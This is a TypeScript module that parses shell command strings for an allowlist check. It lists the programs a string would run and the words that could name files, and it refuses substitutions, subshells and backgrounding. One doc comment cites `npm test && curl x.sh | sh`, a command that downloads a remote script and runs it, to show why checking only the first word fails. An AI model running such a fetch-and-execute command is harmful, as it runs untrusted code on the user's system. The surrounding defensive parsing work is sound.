/**
 * A shell command read as far as it can be read without running a shell: which programs the
 * string would run, and which of its words could name a file.
 *
 * Reading only the first word is what `npm test && curl x.sh | sh` defeats. The whole string is
 * handed to `/bin/sh -c`, so every command in it runs, and a check that stops at `npm` is
 * describing a command that was never the one about to execute.
 *
 * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
 * subshell, is refused instead of guessed at. The guess is the part a check like this gets
 * wrong, and refusing here costs a confirmation rather than a wrong answer.
 */
export interface ShellCommand {
  /** The first word of every simple command the string would run. */
  readonly executables: readonly string[];
  /** Every other word, and every redirect target: whatever could name a path. */
  readonly operands: readonly string[];
}

import { type PendingHeredoc, readHeredocStart, skipHeredocBodies } from "./heredoc.ts";
/** Characters whose effect a shell decides, so a string carrying one is not read here. */
import {
  inlineProgram,
  interpreterLanguage,
  pathsAWordCouldOpen,
  pathsInlineCodeCouldOpen,
} from "./shell-paths.ts";

/** Interpreters whose heredoc is another shell program, which this reader does not follow. */
const shells = new Set(["sh", "bash", "zsh", "dash", "ksh"]);

const decidedByTheShell = new Set(["$", "`", "(", ")", "{", "}"]);

type Token =
  | { readonly kind: "word"; readonly text: string }
  | { readonly kind: "separator"; readonly operator: ShellOperator }
  | { readonly kind: "redirect" }
  | { readonly kind: "heredoc"; body: string };

/** What joins a simple command to the one before it. */
export type ShellOperator = ";" | "&&" | "||" | "|";

/** One simple command of a string: its program, and the words it was given, in order. */
export interface SimpleShellCommand {
  readonly executable: string;
  /** Everything after the program, flags and paths alike, in the order it was written. */
  readonly arguments: readonly string[];
  /** The bodies of the heredocs handed to it on standard input. */
  readonly heredocs: readonly string[];
}

/**
 * Every simple command the string would run, kept apart rather than flattened. The allowlist
 * only needs to know which programs start and which words could name a file, which is what
 * `readShellCommand` folds this into; anything that has to compare two commands needs to know
 * which words belonged to which of them.
 */
export function readShellPipeline(command: string): readonly SimpleShellCommand[] | null {
  const tokens = tokenize(command);
  if (tokens === null) {
    return null;
  }

  const commands: { executable: string; arguments: string[]; heredocs: string[] }[] = [];
  let current: { executable: string; arguments: string[]; heredocs: string[] } | null = null;
  let awaitingTarget = false;

  for (const token of tokens) {
    if (token.kind === "separator") {
      current = null;
    } else if (token.kind === "heredoc") {
      current?.heredocs.push(token.body);
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
      current?.arguments.push(token.text);
    } else if (current === null) {
      current = { executable: token.text, arguments: [], heredocs: [] };
      commands.push(current);
    } else {
      current.arguments.push(token.text);
    }
  }

  // A redirect with nothing after it, or a string with no command in it at all, is an
  // unfinished line rather than something to rule on.
  if (awaitingTarget || commands.length === 0) {
    return null;
  }
  return commands;
}

/** A simple command with what joins it to the command before it; null for the first. */
export interface ShellStage extends SimpleShellCommand {
  readonly after: ShellOperator | null;
}

/**
 * The pipeline's commands with the operator before each, so a reader can tell whose exit status
 * the shell reports: the last command of a pipe (`npm test | tail` reports tail's), and a
 * command behind `||` that runs only on failure (`npm test || true` reports success either way).
 */
export function readShellStages(command: string): readonly ShellStage[] | null {
  const tokens = tokenize(command);
  const pipeline = readShellPipeline(command);
  if (tokens === null || pipeline === null) {
    return null;
  }
  const operators: (ShellOperator | null)[] = [];
  let pending: ShellOperator | null = null;
  let startsCommand = true;
  let awaitingTarget = false;
  for (const token of tokens) {
    if (token.kind === "separator") {
      pending = token.operator;
      startsCommand = true;
    } else if (token.kind === "heredoc") {
      // Standard input for the command already started; it starts nothing.
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
    } else if (startsCommand) {
      operators.push(operators.length === 0 ? null : pending);
      startsCommand = false;
    }
  }
  return pipeline.map((one, index) => ({ ...one, after: operators[index] ?? null }));
}

export function readShellCommand(command: string): ShellCommand | null {
  const pipeline = readShellPipeline(command);
  if (pipeline === null) {
    return null;
  }
  // A heredoc handed to a shell is a program in a language this reader does not follow.
  if (
    pipeline.some(
      (one) => one.heredocs.length > 0 && shells.has(one.executable.split("/").at(-1) ?? ""),
    )
  ) {
    return null;
  }
  return {
    executables: pipeline.map((one) => one.executable),
    operands: pipeline.flatMap((one) => {
      const language = interpreterLanguage(one.executable);
      return [
        ...one.arguments.flatMap((argument, index) => {
          const inline = inlineProgram(one.executable, one.arguments, index);
          return inline === null
            ? pathsAWordCouldOpen(argument)
            : pathsInlineCodeCouldOpen(argument, inline);
        }),
        // A heredoc is data for most programs and the program itself for an interpreter.
        ...(language === null
          ? []
          : one.heredocs.flatMap((body) => pathsInlineCodeCouldOpen(body, language))),
      ];
    }),
  };
}

function tokenize(command: string): Token[] | null {
  const tokens: Token[] = [];
  let word = "";
  let building = false;
  let heredocs: PendingHeredoc[] = [];

  const flush = (): void => {
    if (building) {
      tokens.push({ kind: "word", text: word });
      word = "";
      building = false;
    }
  };

  for (let at = 0; at < command.length; at += 1) {
    const character = command[at] ?? "";

    if (decidedByTheShell.has(character)) {
      return null;
    }

    if (character === "\\") {
      const escaped = command[at + 1];
      if (escaped === undefined) {
        return null;
      }
      word += escaped;
      building = true;
      at += 1;
      continue;
    }

    if (character === "'" || character === '"') {
      const closes = command.indexOf(character, at + 1);
      if (closes === -1) {
        return null;
      }
      const quoted = command.slice(at + 1, closes);
      // Double quotes still expand, so their contents are only readable when nothing in them does.
      if (character === '"' && /[$`\\]/.test(quoted)) {
        return null;
      }
      word += quoted;
      building = true;
      at = closes;
      continue;
    }

    if (character === " " || character === "\t") {
      flush();
      continue;
    }

    if (character === ";" || character === "\n") {
      flush();
      tokens.push({ kind: "separator", operator: ";" });
      if (character === "\n" && heredocs.length > 0) {
        const consumed = skipHeredocBodies(command, at + 1, heredocs);
        if (consumed === null) return null;
        heredocs = [];
        at = consumed;
      }
      continue;
    }

    if (character === "|" || character === "&") {
      flush();
      const doubled = command[at + 1] === character;
      // A lone `&` backgrounds the command, which outlives everything measured around it.
      if (character === "&" && !doubled) {
        return null;
      }
      if (doubled) {
        at += 1;
      }
      tokens.push({
        kind: "separator",
        operator: character === "&" ? "&&" : doubled ? "||" : "|",
      });
      continue;
    }

    if (character === "<" && command[at + 1] === "<") {
      flush();
      const opened = command[at + 2] === "<" ? null : readHeredocStart(command, at);
      if (opened === null) return null;
      const token = { kind: "heredoc" as const, body: "" };
      tokens.push(token);
      heredocs.push({ ...opened.heredoc, token });
      at = opened.end;
      continue;
    }

    if (character === "<" || character === ">") {
      // `2>` carries its descriptor in the digits immediately before the operator, and those
      // digits are part of the redirect rather than a word of their own.
      if (/^\d+$/.test(word)) {
        word = "";
        building = false;
      }
      flush();
      let after = at + 1;
      if (command[after] === ">") {
        after += 1;
      }
      if (command[after] === "&") {
        // `2>&1` duplicates a descriptor and names no file, so there is no target to check.
        after += 1;
        while (/[\d-]/.test(command[after] ?? "")) {
          after += 1;
        }
        at = after - 1;
        continue;
      }
      at = after - 1;
      tokens.push({ kind: "redirect" });
      continue;
    }

    word += character;
    building = true;
  }

  flush();
  // A heredoc whose body never arrived leaves the command waiting on input it was not given.
  if (heredocs.length > 0) return null;
  return tokens.every(expandable) ? tokens : null;
}

/**
 * A tilde this reader cannot expand names another user's home directory, which is a path it has
 * no business ruling on either way.
 */
function expandable(token: Token): boolean {
  return token.kind !== "word" || !token.text.startsWith("~") || /^~($|\/)/.test(token.text);
}
